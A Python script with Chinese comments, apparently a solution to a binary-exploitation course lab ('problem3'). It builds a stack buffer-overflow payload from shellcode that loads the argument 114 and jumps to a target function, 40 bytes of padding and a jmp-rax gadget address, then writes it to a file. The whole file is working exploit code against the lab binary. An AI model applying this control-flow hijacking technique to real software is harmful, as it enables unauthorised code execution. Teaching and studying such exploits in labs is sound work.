# problem3_exploit.py
import struct

# 核心地址
# 1. 目标函数 func1: 它里面藏着我们要的输出结果
#    地址来自 objdump: 401216:  push %rbp 
func1_addr = 0x401216 

# 2. 跳板函数 jmp_xs:帮我们自动计算栈地址
# 地址来自 objdump: 401334: jmp *%rax
jmp_xs_addr = 0x401334

# 编写 Shellcode  
shellcode = (
    # 1: 准备参数 114 (十六进制 0x72)
    b"\x6a\x72"             # push 0x72
    b"\x5f"                 # pop rdi      (现在的 rdi = 114)

    # 2: 准备 func1 的地址放入寄存器 eax
    # b8 是 mov eax 指令，后面跟地址 (小端序)
    b"\xb8\x16\x12\x40\x00" # mov eax, 0x401216

    # 3: 跳过去执行 func1
    b"\xff\xe0"             # jmp rax
)

# 填充与组装
# 缓冲区总长 40 字节 (到返回地址的距离)
# Payload = [Shellcode] + [填充字符] + [jmp_xs地址]
padding_len = 40 - len(shellcode)
payload = shellcode + b'A' * padding_len + jmp_xs_addr.to_bytes(8, 'little')

#写入文件 
with open("problem3.txt", "wb") as f:
    f.write(payload)

print("problem3.txt 生成完毕！")